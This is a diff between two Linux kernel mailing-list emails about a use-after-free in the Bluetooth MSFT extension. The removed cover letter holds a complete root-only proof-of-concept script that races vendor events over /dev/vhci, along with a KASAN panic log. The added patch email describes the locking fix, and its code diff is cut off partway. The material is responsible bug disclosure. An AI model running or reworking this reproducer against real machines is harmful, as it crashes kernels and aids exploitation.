@@ -1,61 +1,63 @@
-Received: from mail-pj1-f49.google.com (mail-pj1-f49.google.com [209.85.216.49])
+Received: from mail-pj1-f50.google.com (mail-pj1-f50.google.com [209.85.216.50])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 038A1369D5B
-	for <linux-bluetooth@vger.kernel.org>; Fri,  7 Aug 2026 17:14:53 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.49
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AE160369D5B
+	for <linux-bluetooth@vger.kernel.org>; Fri,  7 Aug 2026 17:15:00 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.50
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1786122895; cv=none; b=EIVYEXw0XMS7y8ZYfLvaKviOaEek+xKRz2OVXfysLd0leqPlWNLFnX4tWkBSD+knXneGB82oKiJOihQIzPUNS2Un7Y0cH5wrmzy9+2mER3uCPNtxZak9ZZYlrs/CLPfGz92v5fEdDRJxSbQMBMjrQ/y3CWKKOvFW030Qn36Zrao=
+	t=1786122902; cv=none; b=ewFow8uakRCj8EDQacfzkGrvnQBMWBv4nqTw9+N8/rYbNjKXGG+2ywsYWQH83v4PSsppGHV/htsUijGMu6y1KWlZ33c+o71XXde4J5sKFSkoma/1LTOvu/4z3Wd8NJwmv2gqOISNvuT5jmmfqOd4cSn8JYk8EZwIDnL2awHTxMQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1786122895; c=relaxed/simple;
-	bh=JYxGlpUlmfqREsc3LMXyKmqsRWJddYBSaFzxw1ZBVMA=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=fjL26vEikaIgyLjpKQTNtRxXeoRLmlvUmGXmeY7hoWcfgESjHGxbB94UD7sGu7LwM+1GOkbkKpdnOvhwMtPU2dbRQj3DK0NSJvQYfPFK9FyDJujaQGmytYztkHU6tqZLR83/a1OyusodoUdrFABOOhRE5p/ibe40Pt1d3QOuBlA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=VJw9Z/7f; arc=none smtp.client-ip=209.85.216.49
+	s=arc-20240116; t=1786122902; c=relaxed/simple;
+	bh=WB8dRUf6XLxfanapOu0sYFXda3FdAbvfroLTLDi6lys=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=Psv8TjZrf/Yxq8b1dIextREKTIG51b26+UJ6x1Iink+wNjP6tiOExRQicGFPO/2DbdGtn4/vZyfQ/I3ntsv+JvWreMT28jtQbO/t8QpGWHqflWNRNX647osD15Ppfw7f0rfJayXwREXfKySi/vN9lHM1rUaSWJOrEPVWO1CneFc=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=gpVdx+zo; arc=none smtp.client-ip=209.85.216.50
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="VJw9Z/7f"
-Received: by mail-pj1-f49.google.com with SMTP id 98e67ed59e1d1-3810c5d691bso3330265a91.1
-        for <linux-bluetooth@vger.kernel.org>; Fri, 07 Aug 2026 10:14:53 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="gpVdx+zo"
+Received: by mail-pj1-f50.google.com with SMTP id 98e67ed59e1d1-38dfe7eb825so3035965a91.0
+        for <linux-bluetooth@vger.kernel.org>; Fri, 07 Aug 2026 10:15:00 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1786122893; x=1786727693; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=/Q6m3OMrEt51ELYI2pSG5NFONYhS5f8n4zAepuReBos=;
-        b=VJw9Z/7fy5d1z2+melPGrLuxOOGJwedZuyfoLv9ZauBjJpdtz1qds0va3sv0xxAkbu
-         m7JfF/outXOkhmaOGT6y59PqensuSxlgeqrjhHvAbI6loXpa2DoBSOmAXoXQD0BHnvkE
-         X90169b/U6UZDD8SrVlJ+Pv93swB5ySEhjZZ4vw4h0asXh7c5CqyIntyc/pJdHCnK+9j
-         bz4w5L3iY4RYp3+iZIhdGCVzLtV+e6Y+qWYwKUI9ccKe0H0j3eUprEROqKpqZNA9DSlB
-         V7qaLR6rUyREbI7TWZoJTQILEO0yiHAqJLxLaCPtmAHxXUdz/hQE8rpkW9NKHaW+xK21
-         Ykxw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1786122893; x=1786727693;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=gmail.com; s=20251104; t=1786122900; x=1786727700; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=/Q6m3OMrEt51ELYI2pSG5NFONYhS5f8n4zAepuReBos=;
-        b=EE1yihhH7YxPx7AQKOPQdUJfU4Ks0KpFUyPldlcx/ySml1ET9uQW9EjXeII8IGPeZt
-         Slx3rRsklC8zHCEXH9qK7bLvSBsx+ZdsfCiD3VphTM5v+ZMmy+TtQrHbNpoP1zp7uOYf
-         /WHniAyPqFd48egbpRB06mwvIjbUJtptwAV9pwYIW9QqXpJd6dFbCA2knusxb4c80S9j
-         Q2CplWKOwt74YE10Io0joX5lk9ycQK1UEKYFi9X0mhdaeB8DX7b6jwl9KTMLG3t7as42
-         v+8hbb+Av0w8Z5+FtUJRR+M0ZE5jZvb354X079o4nX30OS7w2wyEGOI9VzhMA57e2BaN
-         rt7g==
-X-Gm-Message-State: AOJu0Yx04jcgnoGtkYysWdOgk1TE2ym5RNRDWGXVqmcJrM6kLqGewmrj
-	gNv1lcXHl5x3B5eNHeubihvCGw3SPRZGcffu5AaNTJioCZA2bUYlsFvllxaN2csu
-X-Gm-Gg: AR+sD13gw6VOtHKLDWtSmLqJlBNsekxXQl2yFZAhkA9xF0c+NI1NKx1m77TVw2bnJrV
-	p3CVLQMj5HGNOOWjPpQBsicLdGRLoFhG+qVfPMzPLvFrIJnw49qgy2uGqkR6PuBjWimhcRRKeTp
-	p+WL1oTBRC6Sx4JQftmhVtvNWJ1kzqeRteevv9wPqAcijrnG0T1aiLpadDtssVmbXFhuHSHwLwx
-	Rdh94/BUxYwhYFq79tLLS+dYzSxQedjR6wpcQ7O0ENc8CmYK6dFXT2EaoRwXvqewOLlT9ZVQ1gg
-	yL7zlXga57o2biHGymok4IL3QdMx5mnOUEi5kXCq8Zqh++pky6BHx9Lb1JkmXhhRtFJmGM8h2jX
-	NYb07/e6Py12VmsI6IcYSqE2fAsv1bLGB3svg98V/+BDkip/Jy5Ye2umKA6RRJWWVw36s40t0o7
-	OA5wuTzxSKXd0HUExCMAsFtcwoX3Vbxboomnm78FNsuvsIQaOiE64VtIQm9RwCa6CXHmNnkmthV
-	hqBWK9/q9+tCRE=
-X-Received: by 2002:a17:90b:3985:b0:37c:18e0:90dc with SMTP id 98e67ed59e1d1-3903c5f41ccmr19311234a91.16.1786122893168;
-        Fri, 07 Aug 2026 10:14:53 -0700 (PDT)
+        bh=lPuNzfnUATtwtcxlughhAs7uGIbQAduY3vyUAuT3Jqk=;
+        b=gpVdx+zoq5X5oNAoGxfxcQssVVilKBh7xH3g7Ban5sas9DbZB0EqpicoYdzLsKXvdO
+         op0+p3o+9so9lGJ0deZHqjL8hqeMWhmovB7InmJo+Myf8gUOC8DqlJicyz4ChGpqclqt
+         N6Im9I90HNcUH+5FItioZwgqmzjurcg+b5QwHsCZfpCPqo+36ohKdep15hiqktyL0NtZ
+         N/BbZm2FWtvGSYDkZrmmW8Lzb+RrrJkA15LtK9aPKSuQ+72YZ4kIDBForqpN9emUwj/I
+         tddPSw2SD0tGM+/cZpMCQCqiBJuBgXIf3I9xoEZI5KyOF9Gfsg3u3RgkUQzZLB7y5tMY
+         jahg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1786122900; x=1786727700;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=lPuNzfnUATtwtcxlughhAs7uGIbQAduY3vyUAuT3Jqk=;
+        b=OdzLi9hSqmCBZLpBHwnuQu8+c0mcAahIo5f+5Wp3vqTbz1HXERGs4VbYgTChQ0O5f1
+         JGW2J0/fW0S/Ma4oFCoLqnJPO+iCkXeja+fTQlnFJXd6jSiJ09ymbeSrn/QmGS0e/8Rr
+         9etzVrJEpUcJR8J/DMV4F2wIKtoetrrglWBgSEHxG2EtjjQqInK1cekbHoL+lyofuwAN
+         0DjPMZjVoKF9A2eA847qTKGD6RxrsZZmhiEbGtStqyP3PVsvSWm/605w8q+gGbqCBdGA
+         HEwAcoNREnB5YHrOupFghD/T/ZVOIaDBqKMeeQytIdP0Hy5iZ2rmQgKsrpni+L0zZMkw
+         nIJw==
+X-Gm-Message-State: AOJu0YyWkKAFVJ8TU84Qvr+EwbPRKH6QdSItfg4pZ12MF//anMUqdZ0I
+	hy5yAw1en5l0Bq09uJFfldw/61fvOSYcKVq6HFrC8AomGl8Q+0nhFhvSFsgFQgQC
+X-Gm-Gg: AR+sD11SasfZtPNloz6leFedtIZQ28U13iVtLcF9NrxawOH2CKOiFNBLYK6XRFFq3ft
+	bz8SX/pp4i1BquOIleN6Z+iKoqpjze7jm7ph6YGyqdXRjsaERGLeQUnoInRi36FgOCd4wzMBjXh
+	tJlCLwDZ64D14ORfRQ/sSYD9ch4rw2Nm1ghKwj3HaSv+Oe3nteJB+3G2N8NGT2mWqKilm5C7gXL
+	mHxe+P9Ux1sls9Ck0k3/arnxvg7qwEsHvHebdQwB5yO+jDd+5HT6L4Xb9xNbGVuOvgCIx5XGdqx
+	EJqibQUXhcxLAX8tfBmq4SuyIk0mGLF2Rsec0gOXuYZXH7gzJRhqS11vIhWm0UJVKx5M9bFGSHC
+	ReYL6dRWrzOwxIajxDXaateTNy2BqehipN6rd+LafAzvmmWMOzEZz/IYOhrweagLBWcrIpQl8nV
+	pbohHsHgLXihicelRE4QFAEEg45dl+SApYRSIWBtoDv7sDxDb7YoLisUmnQz5VCJ7Gx22OZCdim
+	4ls
+X-Received: by 2002:a17:90b:3c8d:b0:381:28e0:6259 with SMTP id 98e67ed59e1d1-3909d822517mr11992908a91.9.1786122899819;
+        Fri, 07 Aug 2026 10:14:59 -0700 (PDT)
 Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
-        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-390b150ef29sm1646254a91.1.2026.08.07.10.14.45
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-390b150ef29sm1646254a91.1.2026.08.07.10.14.53
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Fri, 07 Aug 2026 10:14:52 -0700 (PDT)
+        Fri, 07 Aug 2026 10:14:59 -0700 (PDT)
 From: Ren Wei <enjou1224z@gmail.com>
 To: linux-bluetooth@vger.kernel.org
 Cc: marcel@holtmann.org,
@@ -68,10 +70,12 @@ Cc: marcel@holtmann.org,
 	vega@nebusec.ai,
 	edragain@163.com,
 	enjou1224z@gmail.com
-Subject: [PATCH RESEND 0/1] Bluetooth: msft: fix vendor event use-after-free during open
-Date: Sat,  8 Aug 2026 01:14:44 +0800
-Message-ID: <cover.1786092373.git.edragain@163.com>
+Subject: [PATCH RESEND 1/1] Bluetooth: msft: fix vendor event use-after-free during open
+Date: Sat,  8 Aug 2026 01:14:45 +0800
+Message-ID: <ea4efa51cc3be16d3eb7726fe5486f0be6c47907.1786092373.git.edragain@163.com>
 X-Mailer: git-send-email 2.51.0
+In-Reply-To: <cover.1786092373.git.edragain@163.com>
+References: <cover.1786092373.git.edragain@163.com>
 Precedence: bulk
 X-Mailing-List: linux-bluetooth@vger.kernel.org
 List-Id: <linux-bluetooth.vger.kernel.org>
@@ -81,21 +85,6 @@ MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
 From: Yong Wang <edragain@163.com>
-
-Hi Linux kernel maintainers,
-
-We found and validated a use-after-free in net/bluetooth/msft.c.
-The bug is reachable by root on systems exposing /dev/vhci and the
-Bluetooth debugfs controls. We tested the fix with the original
-reproducer and verified that it no longer crashes the guest. We also
-verified that the existing MSFT monitor functionality still works in
-the same setup.
-
-We provide the technical details and the reproducer below.
-
----- details below ----
-
-Bug details:
 
 Commit 5031ffcc79b8 ("Bluetooth: Keep MSFT ext info throughout a
 hci_dev's life cycle") changed msft_do_open() to reuse the live
@@ -111,389 +100,173 @@ Since HCI vendor events may still be processed while HCI_INIT is set,
 vendor event handling can race with msft_do_open() and hit a use-after-
 free on the old prefix buffer or the msft_data object itself.
 
-We reproduced the bug with a vhci-based setup that emulates a LE-only
-controller, enables the MSFT opcode through debugfs, seeds a large event
-prefix, and then sprays vendor events across the LE Set Event Mask ->
-msft_do_open() transition while repeatedly power-cycling the device.
-The crash we observed was a KASAN slab-use-after-free in memcmp() from
-msft_vendor_evt(), running on hci_rx_work.
-
-The reproducer requires python3, /dev/vhci and Bluetooth debugfs.
-
-Reproducer:
-
-    cp poc.sh /root/poc.sh
-    chmod +x /root/poc.sh
-    ATTEMPTS=400 POC_TIMEOUT=180 /root/poc.sh
-
-We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-------BEGIN poc.sh------
-
-#!/bin/sh
-set -eu
-
-if [ "$(id -u)" -ne 0 ]; then
-	echo "run as root" >&2
-	exit 1
-fi
-
-exec python3 - "$@" <<'PY'
-import fcntl
-import os
-import select
-import socket
-import struct
-import sys
-import threading
-import time
-
-HCIDEVUP = 0x400448C9
-HCIDEVDOWN = 0x400448CA
-AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
-BTPROTO_HCI = getattr(socket, "BTPROTO_HCI", 1)
-HCI_COMMAND_PKT = 0x01
-HCI_EVENT_PKT = 0x04
-HCI_VENDOR_PKT = 0xFF
-HCI_EV_CMD_COMPLETE = 0x0E
-
-MSFT_OPCODE = 0xFC1E
-PREFIX_A = b"A" * 241
-PREFIX_B = b"B" * 241
-ATTEMPTS = int(os.environ.get("ATTEMPTS", "400"))
-RACE_THREADS = int(os.environ.get("RACE_THREADS", "2"))
-TIMEOUT = float(os.environ.get("POC_TIMEOUT", "180"))
-
-phase_lock = threading.Lock()
-phase = "first_init"
-attempt = 0
-current_prefix = b""
-next_prefix = PREFIX_A
-
-first_done = threading.Event()
-seed_done = threading.Event()
-stop_evt = threading.Event()
-spray_evt = threading.Event()
-
-devid = None
-vhci_fd = None
-
-
-def get_state():
-    with phase_lock:
-        return phase, attempt, current_prefix, next_prefix
-
-
-def set_phase(new_phase):
-    global phase
-    with phase_lock:
-        phase = new_phase
-
-
-def set_attempt(new_attempt):
-    global attempt
-    with phase_lock:
-        attempt = new_attempt
-
-
-def advance_prefix():
-    global current_prefix, next_prefix
-    with phase_lock:
-        current_prefix = next_prefix
-        next_prefix = PREFIX_B if next_prefix == PREFIX_A else PREFIX_A
-        return current_prefix
-
-
-def cmd_complete(opcode, params):
-    payload = bytes([1]) + struct.pack("<H", opcode) + params
-    return bytes([HCI_EVENT_PKT, HCI_EV_CMD_COMPLETE, len(payload)]) + payload
-
-
-def status_rsp(opcode, status=0):
-    return cmd_complete(opcode, bytes([status]))
-
-
-def local_version_rsp():
-    params = bytes([0x00, 0x09])
-    params += struct.pack("<H", 0)
-    params += bytes([0x09])
-    params += struct.pack("<H", 0)
-    params += struct.pack("<H", 0)
-    return cmd_complete(0x1001, params)
-
-
-def local_features_rsp():
-    feats = bytearray(8)
-    feats[4] = 0x60
-    return cmd_complete(0x1003, b"\x00" + bytes(feats))
-
-
-def local_commands_rsp():
-    return cmd_complete(0x1002, b"\x00" + b"\x00" * 64)
-
-
-def bdaddr_rsp():
-    return cmd_complete(0x1009, b"\x00" + b"\x66\x55\x44\x33\x22\x11")
-
-
-def le_local_features_rsp():
-    return cmd_complete(0x2003, b"\x00" + b"\x00" * 8)
-
-
-def le_buffer_size_rsp():
-    return cmd_complete(0x2002, b"\x00" + struct.pack("<H", 0x001B) + b"\x01")
-
-
-def le_supported_states_rsp():
-    return cmd_complete(0x201C, b"\x00" + b"\x00" * 8)
-
-
-def msft_supported_features_rsp(prefix):
-    params = b"\x00\x00" + struct.pack("<Q", 0) + bytes([len(prefix)]) + prefix
-    return cmd_complete(MSFT_OPCODE, params)
-
-
-def vendor_evt_packet(prefix):
-    payload = prefix + b"\x00"
-    return bytes([HCI_EVENT_PKT, 0xFF, len(payload)]) + payload
-
-
-def spray_worker(worker_id):
-    sent = 0
-    errs = 0
-
-    while not stop_evt.is_set():
-        if not spray_evt.is_set():
-            time.sleep(0.0005)
-            continue
-
-        _, cur_attempt, prefix, _ = get_state()
-        pkt = vendor_evt_packet(prefix)
-
-        try:
-            os.write(vhci_fd, pkt)
-            sent += 1
-        except OSError as exc:
-            if exc.errno not in (6, 16, 19, 110, 111):
-                errs += 1
-                if errs < 10:
-                    print(f"spray{worker_id}: errno={exc.errno} {exc}", flush=True)
-            time.sleep(0.0001)
-
-        if worker_id == 0 and sent and sent % 5000 == 0:
-            print(f"spray attempt={cur_attempt} sent={sent}", flush=True)
-
-
-def control_thread(sock):
-    global devid
-
-    if not first_done.wait(10):
-        print("first init never completed", flush=True)
-        stop_evt.set()
-        return
-
-    if stop_evt.is_set():
-        return
-
-    debugfs_path = f"/sys/kernel/debug/bluetooth/hci{devid}/msft_opcode"
-    print(f"enabling msft opcode via {debugfs_path}", flush=True)
-    with open(debugfs_path, "w", encoding="ascii") as handle:
-        handle.write(f"{MSFT_OPCODE}\n")
-
-    set_phase("seed_init")
-    print("seed power-cycle", flush=True)
-    fcntl.ioctl(sock.fileno(), HCIDEVDOWN, devid)
-    fcntl.ioctl(sock.fileno(), HCIDEVUP, devid)
-    print("seed cycle complete", flush=True)
-
-    if not seed_done.wait(10):
-        print("seed init never reached MSFT read", flush=True)
-        stop_evt.set()
-        return
-
-    for idx in range(1, ATTEMPTS + 1):
-        set_attempt(idx)
-        set_phase("race_init")
-
-        try:
-            fcntl.ioctl(sock.fileno(), HCIDEVDOWN, devid)
-            fcntl.ioctl(sock.fileno(), HCIDEVUP, devid)
-        except OSError as exc:
-            print(f"attempt {idx}: power-cycle failed: {exc}", flush=True)
-            stop_evt.set()
-            return
-
-        spray_evt.clear()
-
-        if idx % 10 == 0:
-            print(f"completed attempts: {idx}", flush=True)
-
-    print("no crash observed within configured attempts", flush=True)
-    stop_evt.set()
-
-
-def handle_command(opcode):
-    cur_phase, cur_attempt, prefix, _ = get_state()
-
-    if opcode == 0x0C03:
-        os.write(vhci_fd, status_rsp(opcode))
-    elif opcode == 0x1003:
-        os.write(vhci_fd, local_features_rsp())
-    elif opcode == 0x1001:
-        os.write(vhci_fd, local_version_rsp())
-    elif opcode == 0x1009:
-        os.write(vhci_fd, bdaddr_rsp())
-    elif opcode == 0x1002:
-        os.write(vhci_fd, local_commands_rsp())
-    elif opcode == 0x2003:
-        os.write(vhci_fd, le_local_features_rsp())
-    elif opcode == 0x2002:
-        os.write(vhci_fd, le_buffer_size_rsp())
-    elif opcode == 0x201C:
-        os.write(vhci_fd, le_supported_states_rsp())
-    elif opcode in (0x0C01, 0x2001):
-        if cur_phase == "race_init" and opcode == 0x2001 and prefix:
-            spray_evt.set()
-        os.write(vhci_fd, status_rsp(opcode))
-        if cur_phase == "first_init" and opcode == 0x2001:
-            first_done.set()
-    elif opcode == MSFT_OPCODE:
-        new_prefix = advance_prefix()
-        os.write(vhci_fd, msft_supported_features_rsp(new_prefix))
-        if cur_phase == "seed_init":
-            print(f"seeded prefix length {len(new_prefix)}", flush=True)
-            seed_done.set()
-        elif cur_phase == "race_init" and cur_attempt % 10 == 0:
-            print(f"MSFT reply on attempt {cur_attempt}", flush=True)
-    else:
-        print(f"unexpected opcode 0x{opcode:04x} in phase {cur_phase}", flush=True)
-        os.write(vhci_fd, status_rsp(opcode))
-
-
-def main():
-    global devid
-    global vhci_fd
-
-    vhci_fd = os.open("/dev/vhci", os.O_RDWR)
-    os.write(vhci_fd, bytes([HCI_VENDOR_PKT, 0x00]))
-    print("created vhci controller", flush=True)
-
-    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_HCI)
-
-    for worker_id in range(RACE_THREADS):
-        thread = threading.Thread(target=spray_worker, args=(worker_id,), daemon=True)
-        thread.start()
-
-    thread = threading.Thread(target=control_thread, args=(sock,), daemon=True)
-    thread.start()
-
-    deadline = time.time() + TIMEOUT
-
-    while time.time() < deadline and not stop_evt.is_set():
-        ready, _, _ = select.select([vhci_fd], [], [], 1.0)
-        if not ready:
-            continue
-
-        data = os.read(vhci_fd, 4096)
-        if not data:
-            print("vhci controller closed", flush=True)
-            break
-
-        pkt_type = data[0]
-
-        if pkt_type == HCI_VENDOR_PKT and len(data) >= 4:
-            _, opcode, lo, hi = data[:4]
-            devid = lo | (hi << 8)
-            print(f"hci{devid} created with create-opcode 0x{opcode:02x}", flush=True)
-            continue
-
-        if pkt_type != HCI_COMMAND_PKT or len(data) < 4:
-            continue
-
-        opcode = data[1] | (data[2] << 8)
-        handle_command(opcode)
-
-    stop_evt.set()
-    spray_evt.clear()
-    print("poc exited without crashing the guest", flush=True)
-    return 1
-
-
-if __name__ == "__main__":
-    sys.exit(main())
-PY
-
-------END poc.sh--------
-
-----BEGIN crash log----
-
-[  443.891897][ T5148] page_owner tracks the page as allocated
-[  443.892364][ T5148] page last allocated via order 2, migratetype Unmovable, gfp_mask 0xd20c0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 1, tgid 1 (swapper/0), ts 29935415922, free_ts 29929297499
-[  443.894452][ T5148] page last free pid 1 tgid 1 stack trace:
-[  443.895834][ T5148] Kernel panic - not syncing: KASAN: panic_on_warn set ...
-[  443.896311][ T5148] CPU: 1 UID: 0 PID: 5148 Comm: kworker/u9:1 Not tainted 6.12.74 #3
-[  443.896864][ T5148] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  443.897571][ T5148] Workqueue: hci0 hci_rx_work
-[  443.897940][ T5148] Call Trace:
-[  443.898179][ T5148]  <TASK>
-[  443.898400][ T5148]  dump_stack_lvl+0x3b/0x1f0
-[  443.898758][ T5148]  panic+0x6fe/0x7e0
-[  443.899068][ T5148]  ? __pfx_panic+0x10/0x10
-[  443.899402][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  443.899843][ T5148]  ? rcu_is_watching+0x12/0xc0
-[  443.900223][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  443.900651][ T5148]  ? __pfx_lock_release+0x10/0x10
-[  443.901054][ T5148]  ? check_panic_on_warn+0x24/0xb0
-[  443.901434][ T5148]  ? memcmp+0x1bd/0x1d0
-[  443.901762][ T5148]  check_panic_on_warn+0xb0/0xb0
-[  443.902128][ T5148]  end_report+0x11b/0x180
-[  443.902473][ T5148]  kasan_report+0xe8/0x110
-[  443.902830][ T5148]  ? memcmp+0x1bd/0x1d0
-[  443.903159][ T5148]  memcmp+0x1bd/0x1d0
-[  443.903473][ T5148]  msft_vendor_evt+0x1e8/0x1a20
-[  443.903854][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  443.904273][ T5148]  ? skb_pull_data+0x16b/0x210
-[  443.904629][ T5148]  hci_event_packet+0xa05/0x11a0
-[  443.905007][ T5148]  ? __pfx_msft_vendor_evt+0x10/0x10
-[  443.905406][ T5148]  ? __pfx_hci_event_packet+0x10/0x10
-[  443.905813][ T5148]  ? __entry_text_end+0x1020b5/0x1020b9
-[  443.906230][ T5148]  ? mark_held_locks+0x94/0xe0
-[  443.906592][ T5148]  ? kcov_remote_start+0x3af/0x6c0
-[  443.907002][ T5148]  ? lockdep_hardirqs_on+0x7b/0x110
-[  443.907381][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  443.907818][ T5148]  hci_rx_work+0x878/0x1680
-[  443.908169][ T5148]  ? process_one_work+0x8d3/0x1b60
-[  443.908561][ T5148]  process_one_work+0x96d/0x1b60
-[  443.908957][ T5148]  ? __pfx_hci_rx_work+0x10/0x10
-[  443.909334][ T5148]  ? __pfx_process_one_work+0x10/0x10
-[  443.909744][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  443.910170][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  443.910585][ T5148]  ? assign_work+0x1a1/0x250
-[  443.910949][ T5148]  worker_thread+0x647/0xe70
-[  443.911311][ T5148]  ? srso_alias_return_thunk+0x5/0xfbef5
-[  443.911739][ T5148]  ? __kthread_parkme+0x137/0x210
-[  443.912125][ T5148]  ? __pfx_worker_thread+0x10/0x10
-[  443.912509][ T5148]  ? __pfx_worker_thread+0x10/0x10
-[  443.912907][ T5148]  kthread+0x2b0/0x3a0
-[  443.913209][ T5148]  ? _raw_spin_unlock_irq+0x28/0x50
-[  443.913590][ T5148]  ? __pfx_kthread+0x10/0x10
-[  443.913988][ T5148]  ret_from_fork+0x4a/0x80
-[  443.914319][ T5148]  ? __pfx_kthread+0x10/0x10
-[  443.914673][ T5148]  ret_from_fork_asm+0x1a/0x30
-[  443.915060][ T5148]  </TASK>
-[  443.915418][ T5148] Kernel Offset: disabled
-[  443.915741][ T5148] Rebooting in 86400 seconds..
-
------END crash log-----
-
-Best regards,
-Yong Wang
-
-Yong Wang (1):
-  Bluetooth: msft: fix vendor event use-after-free during open
-
+Fix this by reading the supported feature data into a temporary object
+first, then updating the live MSFT state only while holding
+hci_dev_lock(). Also make msft_vendor_evt() take hci_dev_lock() before
+reading hdev->msft_data and the event prefix state.
+
+This keeps the published MSFT state stable across the open path and
+serializes it against vendor event processing.
+
+Fixes: 5031ffcc79b8 ("Bluetooth: Keep MSFT ext info throughout a hci_dev's life cycle")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Assisted-by: Codex:GPT-5.4
+Signed-off-by: Yong Wang <edragain@163.com>
+Signed-off-by: Ren Wei <enjou1224z@gmail.com>
+---
  net/bluetooth/msft.c | 70 +++++++++++++++++++++++++++-----------------
  1 file changed, 43 insertions(+), 27 deletions(-)
 
+diff --git a/net/bluetooth/msft.c b/net/bluetooth/msft.c
+index d7badce8746c..ff8629638299 100644
+--- a/net/bluetooth/msft.c
++++ b/net/bluetooth/msft.c
+@@ -133,13 +133,19 @@ struct msft_data {
+ 	struct mutex filter_lock;
+ };
+ 
++struct msft_supported_features {
++	__u64 features;
++	__u8  evt_prefix_len;
++	__u8  *evt_prefix;
++};
++
+ bool msft_monitor_supported(struct hci_dev *hdev)
+ {
+ 	return !!(msft_get_features(hdev) & MSFT_FEATURE_MASK_LE_ADV_MONITOR);
+ }
+ 
+ static bool read_supported_features(struct hci_dev *hdev,
+-				    struct msft_data *msft)
++				    struct msft_supported_features *supported)
+ {
+ 	struct msft_cp_read_supported_features cp;
+ 	struct msft_rp_read_supported_features *rp;
+@@ -166,17 +172,14 @@ static bool read_supported_features(struct hci_dev *hdev,
+ 		goto failed;
+ 
+ 	if (rp->evt_prefix_len > 0) {
+-		msft->evt_prefix = kmemdup(rp->evt_prefix, rp->evt_prefix_len,
+-					   GFP_KERNEL);
+-		if (!msft->evt_prefix)
++		supported->evt_prefix =
++			kmemdup(rp->evt_prefix, rp->evt_prefix_len, GFP_KERNEL);
++		if (!supported->evt_prefix)
+ 			goto failed;
+ 	}
+ 
+-	msft->evt_prefix_len = rp->evt_prefix_len;
+-	msft->features = __le64_to_cpu(rp->features);
+-
+-	if (msft->features & MSFT_FEATURE_MASK_CURVE_VALIDITY)
+-		hdev->msft_curve_validity = true;
++	supported->evt_prefix_len = rp->evt_prefix_len;
++	supported->features = __le64_to_cpu(rp->features);
+ 
+ 	kfree_skb(skb);
+ 	return true;
+@@ -631,6 +634,7 @@ int msft_resume_sync(struct hci_dev *hdev)
+ void msft_do_open(struct hci_dev *hdev)
+ {
+ 	struct msft_data *msft = hdev->msft_data;
++	struct msft_supported_features supported = {};
+ 
+ 	if (hdev->msft_opcode == HCI_OP_NOP)
+ 		return;
+@@ -642,19 +646,29 @@ void msft_do_open(struct hci_dev *hdev)
+ 
+ 	bt_dev_dbg(hdev, "Initialize MSFT extension");
+ 
+-	/* Reset existing MSFT data before re-reading */
+-	kfree(msft->evt_prefix);
+-	msft->evt_prefix = NULL;
+-	msft->evt_prefix_len = 0;
+-	msft->features = 0;
